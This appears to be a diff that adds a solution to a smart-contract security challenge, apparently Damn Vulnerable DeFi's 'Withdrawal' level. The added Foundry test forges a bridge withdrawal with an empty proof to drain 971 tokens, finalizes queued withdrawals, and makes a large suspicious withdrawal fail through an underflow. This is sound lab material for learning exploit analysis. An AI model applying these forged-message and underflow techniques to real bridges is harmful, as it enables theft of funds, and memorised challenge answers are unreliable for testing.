@@ -89,7 +89,75 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+        // Step 1: Warp past the 7-day delay for all withdrawals
+        vm.warp(START_TIMESTAMP + 8 days);
+
+        // Step 2: Operator creates a fake withdrawal to drain enough tokens
+        // to make the 999,000 DVT suspicious withdrawal underflow.
+        // Drain 971 DVT so totalDeposits < 999,000 after legitimate withdrawals.
+        bytes memory fakeInnerMessage = abi.encodeCall(
+            l1TokenBridge.executeTokenWithdrawal,
+            (player, 971e18)
+        );
+        bytes memory fakeForwardMessage = abi.encodeCall(
+            L1Forwarder.forwardMessage,
+            (uint256(100), address(0xbabe), address(l1TokenBridge), fakeInnerMessage)
+        );
+
+        l1Gateway.finalizeWithdrawal({
+            nonce: 0,
+            l2Sender: l2Handler,
+            target: address(l1Forwarder),
+            timestamp: 0,
+            message: fakeForwardMessage,
+            proof: new bytes32[](0)
+        });
+
+        // Step 3: Finalize 3 legitimate withdrawals as operator
+        // Withdrawal #0: 10 DVT
+        l1Gateway.finalizeWithdrawal({
+            nonce: 0,
+            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            timestamp: 1718786915,
+            message: hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000",
+            proof: new bytes32[](0)
+        });
+
+        // Withdrawal #1: 10 DVT
+        l1Gateway.finalizeWithdrawal({
+            nonce: 1,
+            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            timestamp: 1718786965,
+            message: hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000",
+            proof: new bytes32[](0)
+        });
+
+        // Withdrawal #3: 10 DVT
+        l1Gateway.finalizeWithdrawal({
+            nonce: 3,
+            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            timestamp: 1718787127,
+            message: hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000",
+            proof: new bytes32[](0)
+        });
+
+        // Step 4: Finalize suspicious withdrawal #2 (999,000 DVT)
+        // totalDeposits is now 998,999e18 < 999,000e18 → underflow → inner call fails
+        // But the leaf is already finalized in the gateway
+        l1Gateway.finalizeWithdrawal({
+            nonce: 2,
+            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            timestamp: 1718787050,
+            message: hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000",
+            proof: new bytes32[](0)
+        });
+
+        // Step 5: Return the 971 DVT back to the bridge
+        token.transfer(address(l1TokenBridge), 971e18);
     }
 
     /**
